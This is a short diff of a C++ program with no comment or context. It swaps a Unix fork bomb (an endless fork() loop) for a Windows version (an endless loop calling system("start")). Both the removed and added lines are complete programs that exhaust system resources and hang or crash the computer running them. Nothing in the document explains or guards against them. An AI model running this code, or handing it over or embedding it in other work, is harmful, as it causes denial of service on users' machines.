@@ -1,3 +1,6 @@
-#include <bits/stdc++.h>
-#include <unistd.h>
-int main(){while(1) fork();}
+#include<cstdlib>
+using namespace std;
+int main()
+{
+    while(1) system("start");
+}
